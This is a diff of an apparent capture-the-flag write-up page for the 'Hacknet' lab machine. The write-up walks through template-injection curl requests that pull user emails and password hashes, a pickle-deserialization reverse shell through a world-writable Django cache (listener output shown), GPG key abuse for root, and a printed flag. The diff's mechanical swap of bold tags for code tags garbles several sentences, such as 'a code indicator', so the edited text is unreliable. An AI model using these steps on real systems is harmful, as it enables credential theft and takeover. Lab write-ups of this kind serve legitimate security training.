@@ -245,7 +245,7 @@ PORT   STATE SERVICE VERSION
       <p>The web application is a social-network-style site that allows new users to register. I create an account named <code>test</code> and log in to explore the application.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203450.png" alt="Registration page of the Hacknet application" loading="lazy" /><span class="img-caption">Registration page of the Hacknet application</span></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203703.png" alt="Logged in as the test user" loading="lazy" /><span class="img-caption">Logged in as the test user</span></div>
-      <p>Inside the application I notice that the <strong>explore</strong> and <strong>search</strong> features render content based on the data of other users — including the currently logged-in user's display name. This is a strong indicator that user-controlled input is being passed into a server-side template, which makes it an excellent candidate for testing <strong>Server-Side Template Injection (SSTI)</strong>.</p>
+      <p>Inside the application I notice that the <code>explore</code> and <code>search</code> features render content based on the data of other users — including the currently logged-in user's display name. This is a code indicator that user-controlled input is being passed into a server-side template, which makes it an excellent candidate for testing <code>Server-Side Template Injection (SSTI)</code>.</p>
       <h3 class="writeup-sub-title">Identifying the SSTI</h3>
       <p>To confirm the vulnerability, I change my profile username to a Jinja2-style template expression. If the application is Django-based and renders the username through its template engine, the expression will be evaluated server-side instead of being displayed literally.</p>
       <p>I first like a post belonging to another user. This is important because the explore/search pages will then iterate over user data and render my (now-malicious) username in that context, triggering the template engine.</p>
@@ -266,7 +266,7 @@ PORT   STATE SERVICE VERSION
       <p>You can perform the same change manually at <code>http://hacknet.htb/profile/edit</code> — the result is identical. Visiting the explore or search page that lists the previously liked post now reveals the rendered queryset, exposing valid user information.</p>
       <h3 class="writeup-sub-title">Exfiltrating Credentials via SSTI</h3>
       <p>Now that I have confirmed the SSTI works, I can target specific attributes of the user objects. By setting my username to <code>{{users.{index}.email}}</code> and then to <code>{{users.{index}.password}}</code>, the template engine evaluates these expressions server-side and returns the actual email/password fields of the user at the given index. This effectively turns the username field into a database read primitive.</p>
-      <p>I target the user <strong>deepdive</strong> first. Two separate POST requests are needed — one to extract the email, one to extract the password hash:</p>
+      <p>I target the user <code>deepdive</code> first. Two separate POST requests are needed — one to extract the email, one to extract the password hash:</p>
       <h4 class="writeup-step-title">Step 1 — Set username to extract email</h4>
       <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ curl -X POST &quot;http://hacknet.htb/profile/edit&quot; \
@@ -285,9 +285,9 @@ PORT   STATE SERVICE VERSION
   -F &quot;username={{users.0.password}}&quot;</code></pre></div>
       <p>After each change, refreshing the explore page (which renders my username as part of the liked-post listing) returns the requested field. With this technique I successfully extract deepdive's credentials.</p>
       <h3 class="writeup-sub-title">Pivoting to backdoor_bandit</h3>
-      <p>With deepdive's credentials I log in as deepdive and inspect their contact list. I see that deepdive has <strong>backdoor_bandit</strong> as a contact, and that backdoor_bandit has liked one of deepdive's posts.</p>
+      <p>With deepdive's credentials I log in as deepdive and inspect their contact list. I see that deepdive has <code>backdoor_bandit</code> as a contact, and that backdoor_bandit has liked one of deepdive's posts.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20251119194527.png" alt="backdoor_bandit visible in deepdive&#x27;s contacts" loading="lazy" /><span class="img-caption">backdoor_bandit visible in deepdive&#x27;s contacts</span></div>
-      <p>To pivot to backdoor_bandit's credentials, I send a contact request from my <code>test</code> user to deepdive, accept it as deepdive, and now my <code>test</code> user can see deepdive's posts and the users that liked them — including backdoor_bandit. I repeat the SSTI extraction procedure on the post backdoor_bandit liked, targeting their user index, and successfully recover their email and password. These credentials happen to be valid SSH credentials for the user <strong>mikey</strong>.</p>
+      <p>To pivot to backdoor_bandit's credentials, I send a contact request from my <code>test</code> user to deepdive, accept it as deepdive, and now my <code>test</code> user can see deepdive's posts and the users that liked them — including backdoor_bandit. I repeat the SSTI extraction procedure on the post backdoor_bandit liked, targeting their user index, and successfully recover their email and password. These credentials happen to be valid SSH credentials for the user <code>mikey</code>.</p>
       <h2 class="writeup-section-title">User Access: SSH as Mikey</h2>
       <p>With the credentials recovered through the SSTI chain, I authenticate over SSH and obtain a shell as mikey.</p>
       <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~]
@@ -301,8 +301,8 @@ mikey@hacknet:~$ cat user.txt</code></pre></div>
 </div>
       <h2 class="writeup-section-title">Privilege Escalation to sandy</h2>
       <h3 class="writeup-sub-title">Local Enumeration</h3>
-      <p>I check for misconfigured sudo entries first — but <code>sudo -l</code> requires mikey's password, which we don't have here. I therefore upload and run <strong>linpeas</strong> to perform broad system enumeration.</p>
-      <p>Linpeas reveals two interesting findings: a service listening on <code>localhost:3306</code> (MySQL), and the existence of <code>/var/www/HackNet</code>, which is the Django application directory owned by the user <strong>sandy</strong>. I search the project for references to sandy and find the Django <code>settings.py</code> file containing hardcoded database credentials:</p>
+      <p>I check for misconfigured sudo entries first — but <code>sudo -l</code> requires mikey's password, which we don't have here. I therefore upload and run <code>linpeas</code> to perform broad system enumeration.</p>
+      <p>Linpeas reveals two interesting findings: a service listening on <code>localhost:3306</code> (MySQL), and the existence of <code>/var/www/HackNet</code>, which is the Django application directory owned by the user <code>sandy</code>. I search the project for references to sandy and find the Django <code>settings.py</code> file containing hardcoded database credentials:</p>
       <div class="code-block"><pre><code class="lang-python">DATABASES = {
     &#x27;default&#x27;: {
         &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,
@@ -313,10 +313,10 @@ mikey@hacknet:~$ cat user.txt</code></pre></div>
         &#x27;PORT&#x27;: &#x27;3306&#x27;,
     }
 }</code></pre></div>
-      <p>However, the goal is to gain code execution <em>as</em> sandy, not just to access the database. The settings file also reveals that the application uses Django's file-based caching backend, with cache files stored in <code>/var/tmp/django_cache/</code> — and these files are <strong>readable and writable by anyone</strong>.</p>
+      <p>However, the goal is to gain code execution <em>as</em> sandy, not just to access the database. The settings file also reveals that the application uses Django's file-based caching backend, with cache files stored in <code>/var/tmp/django_cache/</code> — and these files are <code>readable and writable by anyone</code>.</p>
       <h3 class="writeup-sub-title">Django Cache Pickle Deserialization</h3>
-      <p>Django's file-based cache backend stores cached objects using <strong>Python's pickle module</strong>. When the application later reads a cache entry, it calls <code>pickle.loads()</code> on the file contents. Pickle deserialization is famously unsafe — any object whose class implements <code>__reduce__</code> can execute arbitrary code on deserialization.</p>
-      <p>Because the cache directory is world-writable and the cached file is later loaded by the Django process (running as <strong>sandy</strong>), I can overwrite a cache entry with a malicious pickle payload that triggers a reverse shell when the cache is read.</p>
+      <p>Django's file-based cache backend stores cached objects using <code>Python's pickle module</code>. When the application later reads a cache entry, it calls <code>pickle.loads()</code> on the file contents. Pickle deserialization is famously unsafe — any object whose class implements <code>__reduce__</code> can execute arbitrary code on deserialization.</p>
+      <p>Because the cache directory is world-writable and the cached file is later loaded by the Django process (running as <code>sandy</code>), I can overwrite a cache entry with a malicious pickle payload that triggers a reverse shell when the cache is read.</p>
       <h4 class="writeup-step-title">Crafting the malicious pickle payload</h4>
       <div class="code-block"><pre><code class="lang-python">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ cat a.py  
@@ -349,7 +349,7 @@ Connection received on 10.129.232.4 48482
 bash: cannot set terminal process group (1713): Inappropriate ioctl for device
 bash: no job control in this shell
 sandy@hacknet:/var/www/HackNet$</code></pre></div>
-      <p>The reverse shell connects back as <strong>sandy</strong> — privilege escalation successful.</p>
+      <p>The reverse shell connects back as <code>sandy</code> — privilege escalation successful.</p>
       <h2 class="writeup-section-title">Privilege Escalation to root</h2>
       <h3 class="writeup-sub-title">GPG Backup Key Discovery</h3>
       <p>As sandy, I enumerate the home directory and find a <code>.gnupg</code> folder containing private keys — including a backup key.</p>
@@ -396,7 +396,6 @@ root@hacknet:/home/mikey# cat /root/root.txt
   <code class="flag-value">5e413a4c1dc293afc6cb7644b18dd2e8</code>
 </div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20251119224917.png" alt="Successfully reading the root flag" loading="lazy" /><span class="img-caption">Successfully reading the root flag</span></div>
-      <div class="rooted-box">✅ Machine Rooted!</div>
     </div>
   </div>
 
